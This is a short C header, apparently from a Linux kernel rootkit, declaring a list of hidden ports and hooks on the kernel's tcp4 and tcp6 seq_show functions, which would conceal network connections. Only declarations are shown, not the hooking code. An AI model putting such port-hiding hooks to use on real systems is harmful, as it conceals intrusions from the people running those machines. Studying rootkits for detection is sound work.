#pragma once

#include "../include/core.h"

struct hidden_ports {
    unsigned short port;
    struct list_head list;
};

extern struct list_head hidden_ports_list;
extern spinlock_t hidden_ports_lock;

int init_hook_tcp4_seq_show(void);
int init_hook_tcp6_seq_show(void);

void exit_hook_tcp4_seq_show(void);
void exit_hook_tcp6_seq_show(void);
